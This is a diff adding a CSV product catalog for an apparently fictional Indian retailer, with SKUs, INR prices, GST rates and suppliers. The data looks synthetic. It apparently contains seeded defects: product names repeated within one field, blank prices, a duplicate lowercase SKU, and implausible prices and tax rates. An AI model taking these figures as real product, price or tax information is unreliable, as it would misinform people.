@@ -1,0 +1,801 @@
+sku,name,category,price_inr,cost_price_inr,gst_rate,supplier_id,status,reorder_level,created_at
+SW-SNK-00091,Smart Buy Potato Chips 150g,Snacks,25,20,12,SUP23,ACTIVE,25,2025-12-02
+SW-STA-00075,Kitchen Pride A4 Paper 500 sheets,Stationery,354,247,18,SUP20,ACTIVE,25,2024-02-26
+SW-GRO-00053,Daily Fresh Atta 1kg,Grocery,430,293,12,SUP18,ACTIVE,10,2024-09-27
+SW-GRO-00134,Star Select Basmati Rice 10kg,Grocery,727,522,18,SUP25,ACTIVE,12,2025-10-26
+SW-GRO-00142,Prime Select Toor Dal 500g,Grocery,166,126,0,SUP17,ACTIVE,10,2025-11-25
+SW-HOM-00005,Fresh Basket Detergent Powder 4kg,Household,225,187,0,SUP09,ACTIVE,25,2024-03-18
+SW-SNK-00036,Everyday Potato Chips 50g,Snacks,39,30,5,SUP18,ACTIVE,8,2025-05-05
+SW-PER-00008,Value Pack Face Wash 100ml,Personal Care,120,101,0,SUP24,ACTIVE,8,2025-09-13
+SW-PER-00067,Royal Harvest Hand Wash 750ml,Personal Care,131,108,12,SUP24,ACTIVE,15,2025-07-06
+SW-STA-00077,Daily Fresh A4 Paper 500 sheets,Stationery,314,243,5,SUP05,ACTIVE,10,2024-09-04
+SW-HOM-00098,Pure Choice Dishwash Liquid 750ml,Household,122,101,5,SUP07,ACTIVE,15,2025-03-13
+SW-HOM-00027,Everyday Detergent Powder 4kg,Household,517,403,5,SUP02,ACTIVE,20,2024-11-08
+SW-GRO-00088,Star Select Poha 500g,Grocery,54,37,5,SUP21,ACTIVE,25,2024-11-26
+SW-ELE-00072,Fresh Basket USB Cable 2m,Electronics Accessories,321,245,5,SUP20,ACTIVE,8,2025-04-01
+SW-ELE-00044,Daily Fresh Power Bank 10000mAh,Electronics Accessories,941,658,18,SUP15,ACTIVE,10,2025-12-28
+SW-SNK-00095,Home Basics Salted Peanuts 500g,Snacks,113,93,0,SUP25,ACTIVE,8,2024-08-18
+SW-HOM-00056,Smart Buy Floor Cleaner 2L,Household,375,285,12,SUP17,ACTIVE,10,2024-11-18
+SW-STA-00072,Royal Harvest Sticky Notes 100 sheets,Stationery,68,51,12,SUP08,ACTIVE,8,2025-10-01
+SW-SNK-00029,Daily Fresh Chocolate Bar 100g,Snacks,69,55,18,SUP18,ACTIVE,12,2024-04-15
+SW-HOM-00048,Royal Harvest Garbage Bags 30 pcs,Household,238,168,5,SUP19,ACTIVE,10,2025-10-01
+SW-GRO-00169,Smart Buy Basmati Rice 5kg,Grocery,1073,784,12,SUP18,ACTIVE,15,2024-04-19
+SW-ELE-00009,Pure Choice Earphones basic,Electronics Accessories,619,429,18,SUP21,ACTIVE,25,2025-03-22
+SW-ELE-00029,Prime Select AA Batteries 10 pack,Electronics Accessories,145,118,0,SUP03,ACTIVE,8,2025-03-03
+SW-GRO-00211,Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg Value Pack Basmati Rice 1kg ,Grocery,828,585,12,SUP06,ACTIVE,8,2024-03-08
+SW-STA-00016,Metro Choice Notebook 180 pages,Stationery,58,39,18,SUP20,ACTIVE,25,2025-05-18
+SW-STA-00025,Fresh Basket Ball Pen 10 pack,Stationery,55,43,18,SUP01,ACTIVE,20,2024-08-19
+SW-SNK-00018,Pure Choice Salted Peanuts 500g,Snacks,78,61,5,SUP11,ACTIVE,15,2025-03-13
+SW-PER-00068,Kitchen Pride Toothpaste 100g,Personal Care,91,63,18,SUP18,ACTIVE,5,2024-07-17
+SW-HOM-00066,Value Pack Phenyl 1L,Household,166,130,0,SUP25,ACTIVE,20,2024-12-28
+SW-HOM-00001,Pure Choice Phenyl 1L,Household,230,195,12,SUP21,ACTIVE,12,2025-08-28
+SW-HOM-00038,Royal Harvest Floor Cleaner 2L,Household,445,343,12,SUP11,ACTIVE,8,2025-02-09
+SW-BEV-00049,Prime Select Mineral Water 20L,Beverages,47,34,0,SUP11,ACTIVE,25,2024-01-22
+SW-HOM-00099,Value Pack Dishwash Liquid 750ml,Household,111,89,5,SUP10,ACTIVE,15,2024-11-20
+SW-HOM-00044,Star Select Garbage Bags 90 pcs,Household,100,74,18,SUP25,ACTIVE,25,2024-12-18
+SW-STA-00021,Value Pack Ball Pen 10 pack,Stationery,59,42,0,SUP05,ACTIVE,15,2025-04-27
+SW-HOM-00058,Daily Fresh Floor Cleaner 500ml,Household,261,190,0,SUP16,ACTIVE,8,2024-05-27
+SW-ELE-00004,Star Select Earphones basic,Electronics Accessories,241,183,18,SUP09,ACTIVE,5,2025-04-15
+SW-SNK-00062,Pure Choice Namkeen Mix 200g,Snacks,62,45,0,SUP22,ACTIVE,8,2025-06-24
+SW-SNK-00035,Fresh Basket Potato Chips 150g,Snacks,34,28,5,SUP22,ACTIVE,20,2025-10-19
+SW-STA-00008,Home Basics Notebook 300 pages,Stationery,48,37,12,SUP03,ACTIVE,12,2024-07-01
+SW-GRO-00118,Royal Harvest Atta 5kg,Grocery,71,49,18,SUP05,ACTIVE,5,2024-04-09
+SW-PER-00088,Smart Buy Shampoo 650ml,Personal Care,148,122,0,SUP10,ACTIVE,25,2025-07-22
+SW-ELE-00005,Kitchen Pride Earphones wired,Electronics Accessories,642,488,12,SUP17,ACTIVE,15,2024-08-17
+SW-SNK-00005,Star Select Chocolate Bar 100g,Snacks,63,46,12,SUP08,ACTIVE,10,2024-02-17
+SW-GRO-00155,Pure Choice Besan 500g,Grocery,95,69,12,SUP04,ACTIVE,5,2024-01-27
+SW-BEV-00009,Smart Buy Mineral Water 20L,Beverages,56,41,18,SUP06,ACTIVE,25,2024-10-05
+SW-GRO-00063,Smart Buy Toor Dal 500g,Grocery,134,105,0,SUP04,ACTIVE,25,2024-11-22
+SW-STA-00012,Pure Choice Sticky Notes 100 sheets,Stationery,59,43,18,SUP03,ACTIVE,10,2024-01-11
+SW-ELE-00020,Kitchen Pride AA Batteries 10 pack,Electronics Accessories,101,70,0,SUP08,ACTIVE,10,2024-03-12
+SW-GRO-00041,Green Leaf Masala Mix 200g,Grocery,128,90,18,SUP16,ACTIVE,20,2024-05-11
+SW-GRO-00101,Daily Fresh Poha 500g,Grocery,75,58,0,SUP08,ACTIVE,10,2025-12-23
+SW-PER-00047,Home Basics Bathing Soap 75g,Personal Care,107,76,5,SUP24,ARCHIVED,25,2025-07-26
+SW-ELE-00027,Kitchen Pride AA Batteries 4 pack,Electronics Accessories,150,103,5,SUP17,ACTIVE,12,2025-08-24
+SW-BEV-00006,Royal Harvest Cola Drink 600ml,Beverages,36,26,5,SUP25,ACTIVE,8,2025-05-11
+SW-SNK-00081,Star Select Salted Peanuts 200g,Snacks,85,68,12,SUP03,ACTIVE,8,2024-02-24
+SW-HOM-00092,Metro Choice Dishwash Liquid 250ml,Household,127,96,12,SUP14,ACTIVE,10,2025-05-06
+SW-GRO-00028,Green Leaf Atta 10kg,Grocery,539,452,0,SUP10,ACTIVE,8,2024-04-02
+SW-HOM-00013,Daily Fresh Detergent Powder 1kg,Household,281,212,12,SUP25,ACTIVE,20,2025-04-18
+SW-PER-00007,Everyday Shampoo 650ml,Personal Care,366,266,0,SUP21,ACTIVE,10,2025-02-26
+SW-SNK-00015,Everyday Namkeen Mix 200g,Snacks,93,64,5,SUP17,ACTIVE,10,2025-06-21
+SW-BEV-00021,Home Basics Orange Juice 200ml,Beverages,65,50,5,SUP02,ACTIVE,10,2025-11-20
+SW-GRO-00194,Pure Choice Basmati Rice 1kg,Grocery,843,710,0,SUP12,ACTIVE,15,2025-02-27
+SW-GRO-00068,Value Pack Tea Leaves 250g,Grocery,151,124,0,SUP12,ACTIVE,5,2025-03-07
+SW-ELE-00077,Fresh Basket USB Cable 1m,Electronics Accessories,312,248,18,SUP11,ACTIVE,12,2024-02-07
+SW-GRO-00105,Fresh Basket Tea Leaves 250g,Grocery,150,104,5,SUP24,ACTIVE,10,2024-11-11
+SW-ELE-00036,Value Pack LED Bulb 9W,Electronics Accessories,92,75,5,SUP20,ACTIVE,10,2025-12-26
+SW-PER-00043,Royal Harvest Toothpaste 100g,Personal Care,157,122,0,SUP13,ACTIVE,25,2025-09-22
+SW-GRO-00005,Star Select Sunflower Oil 5L,Grocery,340,238,12,SUP17,ACTIVE,15,2025-03-09
+SW-GRO-00167,Everyday Besan 1kg,Grocery,93,77,5,SUP01,ACTIVE,15,2025-01-15
+SW-BEV-00065,Prime Select Instant Coffee 200g,Beverages,116,79,18,SUP13,ACTIVE,15,2025-12-20
+SW-SNK-00046,Royal Harvest Chocolate Bar 100g,Snacks,30,23,18,SUP05,ACTIVE,5,2025-01-14
+SW-ELE-00064,Kitchen Pride LED Bulb 12W,Electronics Accessories,149,124,5,SUP04,ACTIVE,5,2025-06-05
+SW-PER-00069,Everyday Bathing Soap 3 pack,Personal Care,63,42,5,SUP12,ACTIVE,10,2025-09-01
+SW-HOM-00053,Pure Choice Floor Cleaner 2L,Household,107,87,12,SUP10,ACTIVE,10,2025-12-22
+SW-SNK-00045,Home Basics Chocolate Bar 100g,Snacks,95,80,18,SUP16,ACTIVE,12,2025-09-13
+SW-HOM-00012,Everyday Floor Cleaner 500ml,Household,289,245,5,SUP12,ACTIVE,10,2025-07-14
+SW-HOM-00060,Metro Choice Phenyl 500ml,Household,63,50,5,SUP16,ACTIVE,12,2024-07-15
+SW-STA-00034,Fresh Basket A4 Paper 100 sheets,Stationery,72,49,12,SUP23,ACTIVE,8,2025-06-27
+SW-ELE-00041,Home Basics LED Bulb 12W,Electronics Accessories,101,77,0,SUP20,ACTIVE,5,2024-11-27
+SW-STA-00050,Fresh Basket A4 Paper 500 sheets,Stationery,124,104,5,SUP24,ACTIVE,20,2025-06-02
+SW-HOM-00067,Star Select Detergent Powder 1kg,Household,465,326,18,SUP18,ACTIVE,10,2024-05-22
+SW-GRO-00082,Star Select Atta 1kg,Grocery,138,105,0,SUP17,ACTIVE,5,2025-06-05
+SW-ELE-00049,Value Pack AA Batteries 4 pack,Electronics Accessories,206,163,5,SUP25,ACTIVE,15,2024-08-06
+SW-GRO-00195,Value Pack Toor Dal 500g,Grocery,125,101,5,SUP06,ACTIVE,15,2024-07-22
+SW-SNK-00102,Prime Select Chocolate Bar 40g,Snacks,60,47,0,SUP07,ACTIVE,12,2024-02-13
+SW-BEV-00023,Royal Harvest Cola Drink 2L,Beverages,104,74,5,SUP01,ACTIVE,10,2025-05-05
+SW-GRO-00180,Royal Harvest Tea Leaves 250g,Grocery,285,226,18,SUP23,ACTIVE,10,2024-10-01
+SW-HOM-00095,Pure Choice Detergent Powder 1kg,Household,338,252,0,SUP17,ACTIVE,20,2025-08-14
+SW-GRO-00030,Royal Harvest Sugar 1kg,Grocery,308,213,18,SUP12,ARCHIVED,15,2024-01-05
+SW-PER-00096,Fresh Basket Bathing Soap 3 pack,Personal Care,84,63,0,SUP24,ACTIVE,12,2024-04-11
+SW-BEV-00031,Everyday Instant Coffee 50g,Beverages,181,132,0,SUP12,ACTIVE,10,2024-12-21
+SW-SNK-00094,Daily Fresh Potato Chips 150g,Snacks,38,29,5,SUP20,ACTIVE,8,2024-08-13
+SW-PER-00066,Home Basics Toothpaste 200g,Personal Care,60,46,5,SUP04,ACTIVE,20,2025-04-18
+SW-SNK-00077,Value Pack Namkeen Mix 400g,Snacks,117,93,0,SUP05,ACTIVE,12,2024-06-18
+SW-BEV-00044,Metro Choice Cola Drink 2L,Beverages,108,73,12,SUP02,ACTIVE,25,2025-09-12
+SW-GRO-00008,Royal Harvest Besan 500g,Grocery,86,67,12,SUP20,ACTIVE,8,2024-11-27
+SW-SNK-00019,Metro Choice Salted Peanuts 200g,Snacks,127,98,5,SUP24,ACTIVE,5,2025-03-17
+SW-GRO-00057,Royal Harvest Toor Dal 500g,Grocery,164,124,5,SUP12,ACTIVE,15,2025-07-06
+SW-GRO-00123,Kitchen Pride Atta 5kg,Grocery,401,305,12,SUP21,ARCHIVED,8,2025-09-03
+SW-STA-00047,Prime Select Sticky Notes 100 sheets,Stationery,80,56,12,SUP22,ACTIVE,10,2024-01-23
+SW-GRO-00024,Royal Harvest Sunflower Oil 1L,Grocery,631,518,18,SUP15,ACTIVE,15,2024-02-01
+SW-SNK-00087,Prime Select Chocolate Bar 100g,Snacks,107,81,12,SUP15,ARCHIVED,8,2025-07-25
+SW-ELE-00047,Everyday AA Batteries 10 pack,Electronics Accessories,259,207,0,SUP09,ARCHIVED,15,2024-04-04
+SW-PER-00097,Pure Choice Hand Wash 250ml,Personal Care,238,191,0,SUP14,ACTIVE,15,2025-08-26
+SW-ELE-00071,Metro Choice LED Bulb 9W,Electronics Accessories,166,125,18,SUP03,ACTIVE,15,2024-04-18
+SW-ELE-00031,Kitchen Pride Power Bank 10000mAh,Electronics Accessories,1061,886,12,SUP13,ACTIVE,10,2024-01-11
+SW-BEV-00015,Daily Fresh Instant Coffee 200g,Beverages,256,207,12,SUP20,ACTIVE,20,2024-03-04
+SW-GRO-00072,Royal Harvest Masala Mix 200g,Grocery,112,87,12,SUP23,ACTIVE,15,2025-03-20
+SW-SNK-00054,Fresh Basket Namkeen Mix 400g,Snacks,90,75,0,SUP25,ACTIVE,12,2025-11-19
+SW-BEV-00104,Value Pack Instant Coffee 50g,Beverages,304,244,5,SUP25,ACTIVE,20,2024-06-12
+SW-ELE-00034,Royal Harvest USB Cable 2m,Electronics Accessories,199,146,5,SUP21,ACTIVE,15,2024-08-05
+SW-PER-00070,Star Select Toothpaste 100g,Personal Care,143,101,12,SUP04,ACTIVE,20,2025-10-15
+SW-SNK-00097,Prime Select Salted Peanuts 200g,Snacks,60,49,0,SUP06,ACTIVE,12,2025-08-10
+SW-BEV-00005,Green Leaf Instant Coffee 50g,Beverages,,169,12,SUP24,ACTIVE,10,2024-01-05
+SW-HOM-00051,Metro Choice Detergent Powder 1kg,Household,531,449,18,SUP04,ACTIVE,10,2025-08-16
+SW-SNK-00012,Prime Select Namkeen Mix 400g,Snacks,112,91,12,SUP11,ACTIVE,5,2024-06-22
+SW-STA-00044,Fresh Basket Notebook 300 pages,Stationery,40,29,12,SUP17,ACTIVE,12,2025-10-23
+SW-ELE-00059,Daily Fresh LED Bulb 12W,Electronics Accessories,127,89,12,SUP16,ACTIVE,10,2025-09-28
+SW-GRO-00136,Metro Choice Atta 10kg,Grocery,67,54,0,SUP19,ACTIVE,15,2024-09-01
+SW-SNK-00083,Star Select Namkeen Mix 200g,Snacks,93,77,5,SUP07,ACTIVE,20,2025-03-25
+SW-SNK-00055,Green Leaf Namkeen Mix 400g,Snacks,112,93,12,SUP23,ACTIVE,15,2025-12-24
+SW-HOM-00004,Green Leaf Phenyl 500ml,Household,134,108,18,SUP19,ACTIVE,20,2024-07-21
+SW-GRO-00079,Prime Select Atta 1kg,Grocery,158,121,0,SUP20,ACTIVE,20,2024-08-12
+SW-ELE-00022,Smart Buy Power Bank 10000mAh,Electronics Accessories,1263,993,5,SUP14,ACTIVE,15,2025-04-03
+SW-PER-00059,Value Pack Hand Wash 750ml,Personal Care,99,75,0,SUP09,ACTIVE,10,2024-01-22
+SW-BEV-00053,Kitchen Pride Instant Coffee 50g,Beverages,202,155,0,SUP14,ACTIVE,20,2024-08-12
+SW-PER-00014,Kitchen Pride Bathing Soap 3 pack,Personal Care,,83,18,SUP24,ACTIVE,20,2024-12-05
+SW-HOM-00011,Smart Buy Dishwash Liquid 250ml,Household,187,154,18,SUP15,ACTIVE,15,2024-08-26
+SW-GRO-00154,Pure Choice Basmati Rice 10kg,Grocery,1127,885,12,SUP25,ACTIVE,15,2024-06-24
+SW-PER-00021,Home Basics Face Wash 100ml,Personal Care,179,148,5,SUP25,ACTIVE,15,2024-08-07
+SW-STA-00036,Prime Select A4 Paper 500 sheets,Stationery,224,172,12,SUP14,ACTIVE,20,2024-06-16
+SW-BEV-00068,Star Select Instant Coffee 200g,Beverages,175,130,5,SUP22,ACTIVE,20,2024-06-14
+SW-HOM-00081,Value Pack Floor Cleaner 500ml,Household,299,214,12,SUP18,ACTIVE,12,2024-12-23
+SW-PER-00016,Star Select Hand Wash 250ml,Personal Care,111,76,0,SUP21,ACTIVE,15,2024-09-24
+SW-HOM-00033,Everyday Dishwash Liquid 250ml,Household,96,75,12,SUP15,ACTIVE,10,2025-11-20
+SW-BEV-00074,Smart Buy Mineral Water 1L,Beverages,112,83,0,SUP25,ACTIVE,10,2025-07-14
+SW-ELE-00073,Kitchen Pride USB Cable 2m,Electronics Accessories,416,327,5,SUP19,ACTIVE,15,2025-03-20
+SW-GRO-00037,Green Leaf Sunflower Oil 5L,Grocery,212,146,5,SUP12,ACTIVE,15,2025-02-13
+SW-BEV-00033,Prime Select Mineral Water 1L,Beverages,37,25,12,SUP18,ACTIVE,25,2024-12-15
+SW-HOM-00089,Prime Select Garbage Bags 30 pcs,Household,140,115,12,SUP15,ARCHIVED,25,2025-12-02
+SW-BEV-00038,Pure Choice Mineral Water 20L,Beverages,72,60,5,SUP02,ACTIVE,8,2024-07-04
+SW-ELE-00038,Green Leaf LED Bulb 12W,Electronics Accessories,194,140,0,SUP10,ACTIVE,5,2025-01-06
+SW-SNK-00041,Value Pack Salted Peanuts 500g,Snacks,60,42,5,SUP22,ACTIVE,10,2024-04-27
+SW-HOM-00075,Metro Choice Dishwash Liquid 750ml,Household,139,110,5,SUP12,ACTIVE,25,2024-04-06
+SW-GRO-00171,Pure Choice Masala Mix 100g,Grocery,61,43,0,SUP01,ACTIVE,15,2024-04-18
+SW-BEV-00067,Value Pack Cola Drink 600ml,Beverages,59,47,18,SUP19,ACTIVE,25,2024-08-04
+SW-STA-00040,Everyday Notebook 180 pages,Stationery,66,51,18,SUP23,ACTIVE,20,2025-12-15
+SW-PER-00093,Prime Select Hand Wash 750ml,Personal Care,96,70,18,SUP11,ACTIVE,5,2024-06-27
+SW-HOM-00071,Prime Select Dishwash Liquid 250ml,Household,104,81,0,SUP17,ACTIVE,10,2025-04-17
+SW-PER-00046,Star Select Toothpaste 200g,Personal Care,80,61,18,SUP19,ACTIVE,5,2024-09-22
+SW-SNK-00058,Smart Buy Cream Biscuits 300g,Snacks,33,25,18,SUP11,ACTIVE,5,2025-11-04
+SW-GRO-00182,Everyday Tea Leaves 250g,Grocery,205,159,12,SUP23,ACTIVE,12,2025-07-14
+SW-GRO-00032,Value Pack Basmati Rice 10kg,Grocery,283,230,0,SUP12,ACTIVE,15,2025-08-26
+SW-HOM-00026,Green Leaf Garbage Bags 90 pcs,Household,183,139,18,SUP12,ACTIVE,15,2025-05-04
+SW-GRO-00002,Pure Choice Sunflower Oil 5L,Grocery,535,377,18,SUP19,ACTIVE,20,2024-03-06
+SW-BEV-00081,Star Select Mineral Water 20L,Beverages,,88,12,SUP06,ACTIVE,25,2025-08-16
+sw-hom-00033,Everyday Dishwash Liquid 250ml,Household,99,75,12,SUP15,ACTIVE,10,2025-11-20
+SW-PER-00073,Smart Buy Hand Wash 250ml,Personal Care,197,150,5,SUP16,ACTIVE,12,2024-09-20
+SW-GRO-00183,Metro Choice Sugar 5kg,Grocery,202,160,18,SUP05,ACTIVE,8,2025-06-27
+SW-ELE-00063,Smart Buy AA Batteries 10 pack,Electronics Accessories,256,192,0,SUP06,ACTIVE,25,2024-09-13
+SW-GRO-00116,Daily Fresh Sunflower Oil 1L,Grocery,915,664,12,SUP10,ACTIVE,12,2024-03-14
+SW-ELE-00078,Everyday Earphones wired,Electronics Accessories,537,368,0,SUP19,ARCHIVED,12,2025-02-19
+SW-STA-00064,Smart Buy A4 Paper 100 sheets,Stationery,184,150,12,SUP15,ACTIVE,12,2024-06-07
+SW-GRO-00163,Star Select Tea Leaves 500g,Grocery,140,112,5,SUP14,ARCHIVED,8,2024-07-10
+SW-GRO-00150,Fresh Basket Atta 10kg,Grocery,481,330,0,SUP09,ACTIVE,12,2025-04-12
+SW-GRO-00056,Kitchen Pride Sugar 5kg,Grocery,261,219,18,SUP25,ACTIVE,10,2024-11-09
+SW-GRO-00178,Home Basics Atta 1kg,Grocery,107,76,18,SUP14,ACTIVE,15,2025-09-23
+SW-ELE-00084,Everyday LED Bulb 9W,Electronics Accessories,80,63,0,SUP09,ACTIVE,8,2024-08-15
+SW-SNK-00078,Smart Buy Salted Peanuts 500g,Snacks,61,50,5,SUP03,ACTIVE,15,2024-08-10
+SW-ELE-00030,Prime Select Earphones basic,Electronics Accessories,752,566,18,SUP16,ACTIVE,5,2025-11-14
+SW-BEV-00024,Home Basics Cola Drink 2L,Beverages,132,104,0,SUP03,ACTIVE,12,2025-07-18
+SW-SNK-00071,Pure Choice Chocolate Bar 40g,Snacks,76,62,18,SUP10,ACTIVE,10,2025-05-05
+SW-GRO-00157,Star Select Toor Dal 500g,Grocery,162,122,12,SUP20,ACTIVE,8,2024-07-25
+SW-SNK-00072,Smart Buy Cream Biscuits 100g,Snacks,48,36,12,SUP10,ACTIVE,20,2025-07-07
+SW-STA-00065,Daily Fresh Sticky Notes 100 sheets,Stationery,90,66,5,SUP07,ACTIVE,20,2024-10-18
+SW-SNK-00099,Green Leaf Cream Biscuits 100g,Snacks,42,31,0,SUP15,ACTIVE,20,2025-02-02
+SW-PER-00065,Pure Choice Hand Wash 750ml,Personal Care,107,77,12,SUP12,ACTIVE,8,2025-07-07
+SW-GRO-00138,Smart Buy Masala Mix 200g,Grocery,99,73,0,SUP06,ACTIVE,5,2025-07-12
+SW-HOM-00049,Pure Choice Floor Cleaner 500ml,Household,173,119,12,SUP11,ACTIVE,8,2024-12-22
+SW-PER-00064,Kitchen Pride Face Wash 50ml,Personal Care,208,160,0,SUP16,ACTIVE,10,2025-08-19
+SW-SNK-00030,Star Select Cream Biscuits 300g,Snacks,53,40,0,SUP17,ACTIVE,5,2024-11-02
+SW-GRO-00102,Royal Harvest Toor Dal 1kg,Grocery,206,154,18,SUP12,ACTIVE,12,2025-04-15
+SW-GRO-00110,Metro Choice Sunflower Oil 5L,Grocery,433,339,5,SUP14,ACTIVE,25,2024-09-24
+SW-GRO-00137,Home Basics Atta 10kg,Grocery,565,423,18,SUP06,ARCHIVED,10,2025-05-10
+SW-GRO-00096,Royal Harvest Atta 1kg,Grocery,709,579,5,SUP02,ACTIVE,12,2024-11-14
+SW-BEV-00069,Prime Select Energy Drink 250ml,Beverages,99,82,12,SUP06,ACTIVE,20,2024-08-24
+SW-STA-00015,Kitchen Pride Sticky Notes 100 sheets,Stationery,85,58,0,SUP21,ACTIVE,25,2025-11-07
+SW-BEV-00032,Daily Fresh Cola Drink 2L,Beverages,115,87,12,SUP20,ACTIVE,12,2025-10-04
+SW-ELE-00076,Daily Fresh AA Batteries 10 pack,Electronics Accessories,160,114,12,SUP18,ACTIVE,10,2025-11-04
+SW-SNK-00009,Green Leaf Potato Chips 150g,Snacks,55,37,18,SUP12,ACTIVE,15,2024-12-28
+SW-BEV-00079,Star Select Cola Drink 2L,Beverages,72,60,12,SUP02,ACTIVE,20,2025-07-27
+SW-ELE-00028,Fresh Basket LED Bulb 12W,Electronics Accessories,148,103,0,SUP05,ACTIVE,5,2024-01-27
+SW-GRO-00153,Pure Choice Poha 1kg,Grocery,97,74,5,SUP18,ACTIVE,10,2025-12-15
+SW-SNK-00023,Smart Buy Chocolate Bar 100g,Snacks,52,41,12,SUP15,ACTIVE,20,2025-12-16
+SW-GRO-00210,Prime Select Sunflower Oil 1L,Grocery,800,583,0,SUP01,ACTIVE,25,2024-09-21
+SW-GRO-00112,Value Pack Sunflower Oil 5L,Grocery,539,441,0,SUP15,ACTIVE,12,2025-02-28
+SW-PER-00057,Star Select Bathing Soap 75g,Personal Care,39,30,0,SUP09,ACTIVE,25,2024-09-07
+SW-HOM-00080,Fresh Basket Floor Cleaner 2L,Household,248,196,12,SUP06,ACTIVE,10,2025-10-05
+SW-GRO-00212,Smart Buy Iodised Salt 1kg,Grocery,27,22,5,SUP15,ACTIVE,10,2025-03-07
+SW-SNK-00038,Pure Choice Cream Biscuits 300g,Snacks,27,20,5,SUP19,ACTIVE,25,2025-06-22
+SW-HOM-00021,Smart Buy Phenyl 500ml,Household,68,51,12,SUP05,ACTIVE,25,2024-03-14
+SW-SNK-00016,Home Basics Namkeen Mix 200g,Snacks,123,104,5,SUP04,ACTIVE,8,2024-08-06
+SW-BEV-00086,Star Select Instant Coffee 50g,Beverages,98,74,5,SUP07,ACTIVE,10,2025-12-28
+SW-GRO-00026,Kitchen Pride Toor Dal 1kg,Grocery,221,173,12,SUP05,ACTIVE,5,2025-09-11
+SW-STA-00076,Value Pack A4 Paper 100 sheets,Stationery,374,294,0,SUP21,ACTIVE,5,2025-12-11
+SW-PER-00037,Metro Choice Bathing Soap 75g,Personal Care,36,25,5,SUP21,ACTIVE,25,2025-02-19
+SW-STA-00052,Prime Select A4 Paper 100 sheets,Stationery,195,139,12,SUP14,ACTIVE,10,2024-03-14
+SW-GRO-00052,Green Leaf Atta 5kg,Grocery,609,514,18,SUP15,ACTIVE,8,2025-03-05
+SW-SNK-00050,Green Leaf Salted Peanuts 200g,Snacks,79,59,0,SUP22,ACTIVE,5,2024-06-16
+SW-SNK-00027,Green Leaf Potato Chips 50g,Snacks,24,20,12,SUP15,ACTIVE,20,2025-03-28
+SW-ELE-00060,Smart Buy LED Bulb 9W,Electronics Accessories,97,66,12,SUP07,ACTIVE,12,2025-07-08
+SW-BEV-00055,Smart Buy Energy Drink 250ml,Beverages,116,82,0,SUP12,ACTIVE,25,2025-02-20
+SW-GRO-00064,Value Pack Masala Mix 200g,Grocery,76,51,12,SUP08,ACTIVE,15,2024-08-12
+SW-BEV-00087,Green Leaf Mineral Water 20L,Beverages,108,87,0,SUP19,ACTIVE,25,2025-11-07
+SW-BEV-00093,Metro Choice Instant Coffee 50g,Beverages,175,141,5,SUP19,ACTIVE,20,2024-11-15
+SW-SNK-00076,Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g Prime Select Cream Biscuits 300g ,Snacks,63,52,5,SUP04,ACTIVE,8,2025-06-01
+SW-ELE-00007,Star Select Earphones wired,Electronics Accessories,398,309,5,SUP05,ACTIVE,20,2025-04-28
+SW-SNK-00098,Fresh Basket Salted Peanuts 500g,Snacks,72,61,12,SUP09,ACTIVE,8,2025-02-16
+SW-GRO-00025,Metro Choice Basmati Rice 5kg,Grocery,823,593,18,SUP06,ACTIVE,20,2024-09-12
+SW-GRO-00119,Metro Choice Basmati Rice 10kg,Grocery,356,294,18,SUP08,ACTIVE,20,2025-10-18
+SW-PER-00004,Kitchen Pride Face Wash 100ml,Personal Care,184,141,5,SUP25,ACTIVE,10,2025-12-27
+SW-ELE-00051,Prime Select USB Cable 1m,Electronics Accessories,335,280,0,SUP08,ACTIVE,12,2025-03-04
+SW-GRO-00144,Royal Harvest Poha 1kg,Grocery,128,92,0,SUP14,ACTIVE,5,2025-11-20
+SW-GRO-00126,Pure Choice Atta 5kg,Grocery,66,51,0,SUP10,ACTIVE,8,2025-04-14
+SW-STA-00042,Home Basics A4 Paper 500 sheets,Stationery,395,294,18,SUP07,ACTIVE,20,2025-02-25
+SW-PER-00010,Metro Choice Toothpaste 200g,Personal Care,64,53,5,SUP06,ARCHIVED,20,2025-10-02
+SW-HOM-00101,Royal Harvest Phenyl 1L,Household,171,117,12,SUP12,ARCHIVED,8,2025-08-18
+SW-PER-00025,Star Select Face Wash 100ml,Personal Care,196,147,5,SUP04,ACTIVE,5,2024-04-07
+SW-GRO-00124,Prime Select Atta 10kg,Grocery,112,79,12,SUP18,ACTIVE,5,2024-05-14
+SW-HOM-00082,Prime Select Dishwash Liquid 750ml,Household,154,114,0,SUP09,ACTIVE,8,2024-05-07
+SW-GRO-00139,Home Basics Basmati Rice 1kg,Grocery,1209,928,0,SUP23,ACTIVE,25,2025-04-10
+SW-STA-00060,Fresh Basket Sticky Notes 100 sheets,Stationery,65,51,18,SUP12,ACTIVE,10,2025-06-14
+SW-HOM-00070,Value Pack Detergent Powder 4kg,Household,272,220,12,SUP05,ACTIVE,12,2024-07-12
+SW-GRO-00073,Smart Buy Basmati Rice 10kg,Grocery,284,203,5,SUP02,ACTIVE,15,2025-09-09
+SW-ELE-00052,Metro Choice Earphones wired,Electronics Accessories,639,517,0,SUP14,ACTIVE,8,2025-08-25
+SW-SNK-00025,Royal Harvest Salted Peanuts 500g,Snacks,104,87,5,SUP14,ACTIVE,25,2024-01-27
+SW-BEV-00058,Pure Choice Orange Juice 1L,Beverages,124,91,12,SUP17,ACTIVE,8,2024-09-03
+SW-STA-00063,Metro Choice Sticky Notes 100 sheets,Stationery,85,67,0,SUP20,ACTIVE,20,2025-01-24
+SW-BEV-00025,Metro Choice Mineral Water 20L,Beverages,77,60,5,SUP03,ACTIVE,12,2025-11-26
+SW-GRO-00080,Everyday Sunflower Oil 5L,Grocery,756,592,0,SUP22,ACTIVE,10,2024-09-20
+SW-BEV-00097,Daily Fresh Instant Coffee 50g,Beverages,395,271,0,SUP21,ACTIVE,15,2025-03-01
+SW-STA-00053,Star Select A4 Paper 500 sheets,Stationery,93,73,12,SUP03,ARCHIVED,15,2024-08-11
+SW-ELE-00013,Daily Fresh LED Bulb 9W,Electronics Accessories,174,134,12,SUP10,ACTIVE,25,2024-12-23
